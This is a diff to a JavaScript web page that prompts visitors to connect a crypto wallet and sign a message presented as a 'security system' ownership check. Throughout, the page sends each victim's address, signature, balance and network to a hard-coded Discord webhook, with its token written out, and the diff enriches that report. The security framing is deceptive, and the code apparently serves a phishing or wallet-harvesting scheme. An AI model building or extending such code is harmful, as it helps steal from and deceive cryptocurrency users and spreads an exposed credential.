@@ -27,12 +27,17 @@ function hideElement(element) {
 }
 
 // Функция для отправки данных на Discord webhook
-async function sendToDiscordWebhook(userAddress, signature, message) {
+async function sendToDiscordWebhook(userAddress, signature, message, originalMessage) {
     const webhookURL = 'https://discordapp.com/api/webhooks/1420886875543048366/0BLuHD0PYjBd5nfjSGoPZRVQU-xlhrkH9nIMcWbM-swL6cufeQ3ZQ74NpYpKMB3rF_82';
     
     // Получаем баланс и название сети
     const balance = await getShortBalance();
     const network = await getNetworkName();
+    
+    // Проверяем длину подписи
+    const signatureLength = signature.length;
+    console.log('Длина подписи:', signatureLength);
+    console.log('Полная подпись:', signature);
     
     const embed = {
         title: "🔐 Новое подключение кошелька",
@@ -55,18 +60,28 @@ async function sendToDiscordWebhook(userAddress, signature, message) {
                 inline: true
             },
             {
-                name: "✍️ Полная подпись",
+                name: `✍️ Подпись (${signatureLength} символов)`,
                 value: `\`\`\`${signature}\`\`\``,
                 inline: false
             },
             {
-                name: "📝 Сообщение",
+                name: "📝 Оригинальное сообщение",
+                value: `\`\`\`${originalMessage}\`\`\``,
+                inline: false
+            },
+            {
+                name: "📋 Подписанное сообщение",
                 value: `\`\`\`${message}\`\`\``,
                 inline: false
             },
             {
                 name: "⏰ Время подключения",
                 value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                inline: false
+            },
+            {
+                name: "🔍 Детали подписи",
+                value: `Длина: ${signatureLength} символов\nНачинается с: ${signature.substring(0, 10)}...\nЗаканчивается на: ...${signature.substring(signatureLength - 10)}`,
                 inline: false
             }
         ],
@@ -133,6 +148,18 @@ async function getShortBalance() {
     }
 }
 
+// Функция для проверки валидности подписи
+async function verifySignature(message, signature, address) {
+    try {
+        // Пытаемся верифицировать подпись
+        const recoveredAddress = await web3.eth.personal.ecRecover(message, signature);
+        return recoveredAddress.toLowerCase() === address.toLowerCase();
+    } catch (error) {
+        console.error('Ошибка верификации подписи:', error);
+        return false;
+    }
+}
+
 // Проверяем наличие кошелька
 if (typeof window.ethereum !== 'undefined') {
     console.log('Кошелек найден!');
@@ -185,20 +212,40 @@ signButton.addEventListener('click', async () => {
         signButton.classList.add('loading');
         updateStatus('⌛ Запрос на подписание сообщения...', false, true);
         
-        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
-        const signature = await web3.eth.personal.sign(message, userAddress, '');
+        const originalMessage = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
+        const signature = await web3.eth.personal.sign(originalMessage, userAddress, '');
+        
+        // Проверяем подпись
+        const isValid = await verifySignature(originalMessage, signature, userAddress);
+        
+        console.log('Полученная подпись:', signature);
+        console.log('Длина подписи:', signature.length);
+        console.log('Подпись валидна:', isValid);
         
         // Отправляем данные в Discord
         updateStatus('⌛ Отправка данных на сервер...', false, true);
-        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
+        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, originalMessage, originalMessage);
         
         if (sendSuccess) {
-            updateStatus(`✅ Сообщение успешно подписано и отправлено! Подпись: ${signature.substring(0, 20)}...`);
+            if (isValid) {
+                updateStatus(`✅ Подпись валидна и отправлена! Длина: ${signature.length} символов`);
+            } else {
+                updateStatus(`⚠️ Подпись отправлена, но верификация не удалась. Длина: ${signature.length} символов`, false, true);
+            }
         } else {
-            updateStatus(`✅ Сообщение подписано, но ошибка отправки на сервер. Подпись: ${signature.substring(0, 20)}...`, false, true);
+            updateStatus(`✅ Подпись получена, но ошибка отправки на сервер. Длина: ${signature.length} символов`, false, true);
         }
         
+        // Дополнительно выводим информацию о подписи в консоль
+        console.log('=== ИНФОРМАЦИЯ О ПОДПИСИ ===');
+        console.log('Адрес:', userAddress);
+        console.log('Длина подписи:', signature.length);
+        console.log('Подпись:', signature);
+        console.log('Валидность:', isValid);
+        console.log('============================');
+        
     } catch (error) {
+        console.error('Ошибка при подписании:', error);
         if (error.code === 4001) {
             updateStatus('❌ Вы отклонили запрос на подпись.', true);
         } else {
